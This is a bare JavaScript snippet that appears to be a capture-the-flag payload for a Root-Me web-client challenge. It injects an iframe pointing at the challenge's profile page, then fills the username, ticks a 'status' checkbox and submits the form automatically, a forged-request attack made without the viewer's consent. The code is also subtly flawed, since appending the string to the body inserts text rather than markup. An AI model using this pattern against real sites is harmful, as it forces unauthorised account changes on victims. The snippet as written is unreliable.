const html1 = `
<iframe
 id="iframe1"
 src="http://challenge01.root-me.org/web-client/ch23/?action=profile"
 onload=' const ifr = document.querySelector("#iframe1"); ifr.contentDocument.querySelector("#username").value = "test1"; ifr.contentDocument.querySelector("#status").checked = true; ifr.contentDocument.forms[0].submit()'
>
</iframe>

`

document.body.append(html1)




